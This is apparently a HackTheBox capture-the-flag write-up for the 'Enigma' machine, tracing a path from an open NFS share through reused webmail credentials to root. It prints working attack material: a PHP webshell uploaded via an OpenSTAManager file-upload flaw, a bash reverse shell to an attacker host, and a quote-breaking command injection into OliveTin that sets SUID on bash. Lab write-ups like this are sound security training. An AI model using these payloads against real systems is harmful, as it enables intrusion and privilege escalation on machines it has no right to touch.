# Enigma – HackTheBox Writeup

**Target:** Enigma (10.129.X.X)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** NFS Share → Roundcube Credentials → OpenSTAManager RCE (CVE-2026-38751) → Database Password Reuse → OliveTin Command Injection → Root

---

## Recon

### Port Scan

```bash
nmap -sV -p- --min-rate 5000 10.129.X.X
```

A lot of ports open on this one. SSH on 22, nginx on 80, POP3 on 110, RPC on 111, IMAP on 143, IMAPS on 993, POP3S on 995, NFS on 2049, plus a bunch of high ports for mountd, nlockmgr, and status. The website at `enigma.htb` is just a corporate "Managed IT Solutions" page with nothing interesting on it. No hidden directories either, just `index.html`.

### NFS Share

NFS on port 2049 was the real entry point. Checked what's exported:

```bash
showmount -e 10.129.X.X
```

```
/srv/nfs/onboarding *
```

The `*` means anyone can mount it. No authentication needed:

```bash
mkdir /tmp/nfs
sudo mount -t nfs 10.129.X.X:/srv/nfs/onboarding /tmp/nfs
ls -la /tmp/nfs
```

One file inside: `New_Employee_Access.pdf`. Opened it and hit the jackpot. It's an onboarding document for a new employee named Kevin Mitchell with his webmail credentials:

```
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

### Subdomain Discovery

Added the subdomains to `/etc/hosts` and ran ffuf to find more:

```bash
ffuf -u http://10.129.X.X -H "Host: FUZZ.enigma.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154
```

The 154 came from the Content-Length of the default 302 redirect response. Only found `mail001.enigma.htb`.

---

## Webmail Access

### Roundcube Login

Opened `http://mail001.enigma.htb` in the browser. It's running Roundcube Webmail. Logged in with Kevin's credentials. Only one email from Sarah in the Accounts department welcoming him to the team. Mentioned that "system access credentials" would be shared via the "company shared drive" which was the NFS share I already looted.

### Finding More Credentials

The onboarding document said the password should be changed on first login, which means it might work on other services too. Tried Sarah's account in Roundcube with the same password `Enigma2024!` and got in. Sarah had an email from IT with access to another service:

```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

OpenSTAManager, an Italian ERP/ticketing system.

---

## Getting a Shell

### OpenSTAManager RCE (CVE-2026-38751)

Added `support_001.enigma.htb` to `/etc/hosts` and opened it. OpenSTAManager login page. Googled `OpenSTAManager CVE` and found CVE-2026-38751, an authenticated arbitrary file upload via the module update mechanism. There's a Rust PoC on GitHub but the precompiled binary didn't work on my ARM Kali (qemu error). Did it manually with curl instead.

First, login and grab a session cookie:

```bash
curl -s -c /tmp/cookies.txt -X POST "http://support_001.enigma.htb/index.php?op=login" \
  -d "username=admin&password=Ne3s4rtars78s"
```

Then create a ZIP file containing a fake module with a PHP webshell inside:

```bash
mkdir -p /tmp/shell

cat > /tmp/shell/MODULE << 'EOF'
name = "shell"
directory = "shell"
version = "1.0"
compatibility = "2.10"
options = ""
icon = "fa fa-bug"
parent = "Dashboard"
EOF

cat > /tmp/shell/shell.php << 'EOF'
<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>
EOF

cd /tmp && zip -r update.zip shell/
```

The MODULE file tells OpenSTAManager this is a valid module. The shell.php is a classic one liner webshell that takes a `c` parameter and passes it straight to `system()`. Upload it through the module update endpoint:

```bash
curl -v -b /tmp/cookies.txt -X POST "http://support_001.enigma.htb/modules/aggiornamenti/upload_modules.php" \
  -F "blob=@/tmp/update.zip"
```

Got a 302 redirect back, upload went through. Tested the webshell:

```bash
curl -s "http://support_001.enigma.htb/modules/shell/shell.php?c=id"
```

Code execution confirmed as `www-data`. Set up a reverse shell:

```bash
nc -lvnp 4444
```

```bash
curl -s "http://support_001.enigma.htb/modules/shell/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"
```

Shell popped.

---

## User Access

### Database Credentials

Found the OpenSTAManager config file with database credentials:

```bash
cat ~/html/openstamanager/config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Dumped the users table and found `haris` with a bcrypt hash:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT * FROM zz_users;"
```

Cracked the hash with John:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > /tmp/hash.txt
john /tmp/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Got `bestfriends`. SSH had `PasswordAuthentication no` so switched to the user through the existing shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su - haris
# Password: bestfriends
```

User flag grabbed.

---

## Privilege Escalation

### Discovering OliveTin

Standard enumeration didn't turn up much. No sudo, no interesting SUUIDs, kernel was recent. But checking internal services revealed something interesting:

```bash
ss -tlnp
```

Port 1337 listening on localhost. Curled it:

```bash
curl -v http://127.0.0.1:1337/
```

It's OliveTin, a web tool that provides buttons to execute predefined shell commands. And it's running as root:

```bash
ps aux | grep -i olive
# root 1479 /usr/local/bin/OliveTin
```

Read the config to see what actions are available:

```bash
cat /etc/OliveTin/config.yaml
```

Two critical things: `authRequireGuestsToLogin: false` meaning no authentication needed, and a "Backup Database" action that takes user input including a `db_pass` parameter of type `password`:

```yaml
- title: Backup Database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_pass
      type: password
```

### Command Injection

OliveTin's input sanitization check (`checkShellArgumentSafety`) blocks dangerous characters in most argument types but not in `password` type fields. The `db_pass` value gets interpolated directly into the shell command inside single quotes. Break out of the quotes and inject a command.

First had to figure out the right API endpoint. The docs say `/api/StartAction` but it uses `bindingId` not `actionId`:

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"test"},{"name":"db_pass","value":"'"'"'; chmod u+s /bin/bash; echo '"'"'"},{"name":"db_name","value":"test"}]}'
```

That quote escaping is gnarly. What it does is break out of the single quotes in the shell command, run `chmod u+s /bin/bash` to set the SUID bit, then cleanly close the quotes again. Since OliveTin runs as root, the chmod runs as root.

Got back a tracking ID which means the command executed. Verified:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

The `s` in the permissions confirms SUID is set.

### Root

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → NFS on 2049, Mail services, HTTP
→ showmount → /srv/nfs/onboarding mounted
→ PDF → kevin:Enigma2024! for Roundcube
→ Sarah's mailbox → admin:Ne3s4rtars78s for OpenSTAManager
→ CVE-2026-38751 (File Upload RCE) → shell as www-data
→ config.inc.php → DB credentials → haris:bestfriends (bcrypt cracked)
→ su haris → user flag
→ OliveTin on port 1337, running as root, no auth
→ Command injection via password argument type
→ SUID bash → root
```

---

## What I Learned

NFS shares are often the easiest entry point on a box. `showmount -e` takes two seconds and if something is exported with `*` it's wide open. Always check NFS when you see port 2049.

Always check every user's mailbox. Kevin's mail was useless but Sarah's had the OpenSTAManager credentials that led to the shell. Don't stop at the first account.

When a precompiled exploit doesn't work on your architecture, read the source code and do it manually. The Rust PoC failed because of ARM vs x86 but the exploit was just a ZIP upload with a PHP webshell. Four curl commands replicated the whole thing.

`PasswordAuthentication no` in SSH means password login is disabled. Don't waste time trying SSH with cracked passwords. Use `su` from an existing shell instead.

OliveTin running as root with `authRequireGuestsToLogin: false` is basically an unauthenticated root command execution interface. The `password` argument type bypasses the input sanitization that blocks shell metacharacters in other argument types. Always check what argument types a tool validates and which ones it skips.

The OliveTin API uses `bindingId` not `actionId` in newer versions. The error message `action with ID not found` was confusing until I read the docs and realized the field name changed. When API calls fail, check the documentation for the exact request format.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
